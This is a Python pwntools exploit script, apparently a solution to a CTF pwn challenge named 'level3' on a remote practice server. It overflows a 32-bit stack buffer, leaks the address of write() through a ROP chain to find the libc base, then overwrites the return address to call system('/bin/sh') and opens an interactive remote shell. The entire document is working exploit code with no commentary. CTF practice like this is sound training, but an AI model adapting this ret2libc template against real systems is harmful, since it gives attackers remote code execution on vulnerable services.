from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27938)
elf = ELF('./level3')
main_addr = elf.symbols['main']
log.success("0x%x", main_addr)
write_plt = elf.plt['write']
write_got = elf.got['write']
payload = b'a'*(0x88+0x4) 
payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
io.sendlineafter(b'Input:\n', payload)
write_addr = u32(io.recv(4))
log.info('write_address => 0x%x', write_addr)
libc = ELF('./libc/libc_32.so.6')
libcbase = write_addr - libc.symbols['write']
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.symbols['system']
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.search(b'/bin/sh').__next__()
log.success('bin_sh_address => %s', hex(bin_sh_addr))
payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(0) + p32(bin_sh_addr)
io.sendlineafter(b'Input:\n', payload)
io.interactive()